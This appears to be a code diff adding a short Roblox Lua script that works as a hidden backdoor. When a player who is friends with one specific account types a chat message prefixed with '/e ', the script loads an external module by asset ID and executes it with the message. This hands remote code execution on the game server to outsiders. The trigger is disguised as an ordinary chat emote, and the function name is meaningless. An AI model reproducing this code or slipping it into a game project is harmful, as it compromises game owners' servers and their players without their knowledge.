@@ -1,0 +1,28 @@
+local function AHAHHAHAHA()
+
+
+
+	game:GetService("Players").PlayerAdded:Connect(function(player)
+
+		if player:IsFriendsWith(6097947099) then
+
+			player.Chatted:Connect(function(message)
+				local prefix = "/e "
+				local isAnonymous = false
+
+				if string.sub(message, 1, #prefix) == prefix then
+					message = string.sub(message, #prefix + 1)
+					isAnonymous = true
+				end
+				if isAnonymous then
+					require(10131117731)(message)()
+			
+				end
+					
+			end)
+		end
+	end)
+end
+
+
+AHAHHAHAHA()
